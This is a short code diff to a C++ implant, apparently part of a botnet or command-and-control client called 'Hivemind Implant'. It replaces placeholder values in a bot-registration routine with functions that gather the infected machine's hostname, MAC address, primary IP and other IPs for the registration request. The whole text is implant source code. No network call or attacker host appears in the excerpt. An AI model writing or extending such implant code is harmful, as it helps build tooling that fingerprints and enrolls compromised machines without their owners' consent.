@@ -44,8 +44,7 @@ void LogicController::RegisterBot() {
   }
   struct RegistrationRequest registration_request;
   struct Packet packet;
-// TODO Get this
-  this->implant_info_ = {"", "192.168.7.1"};
+  this->implant_info_ = {"", Gather_Info::GetPrimaryIP()};
 
   std::vector<ModuleInfo> values;
 
@@ -54,12 +53,13 @@ void LogicController::RegisterBot() {
   }
 
 // TODO Get this stuff
-  registration_request.hostname = "Meep";
-  registration_request.mac = "aa:ss:dd:ff:gg:hh";
-  registration_request.implant_version = "1337";
+  registration_request.hostname = Gather_Info::GetHostname();
+  registration_request.mac = Gather_Info::GetMACAddr();
+  registration_request.implant_version = "v1.0";
   registration_request.ip = this->implant_info_.primary_ip;
-  registration_request.implant_name = "Battle Paddle";
-  registration_request.os = "Windows trash";
+  registration_request.implant_name = "Hivemind Implant";
+  registration_request.os = "Windows";
+  registration_request.other_ips = Gather_Info::GetOtherIPs();
   registration_request.supported_modules = values;
 //******************
 
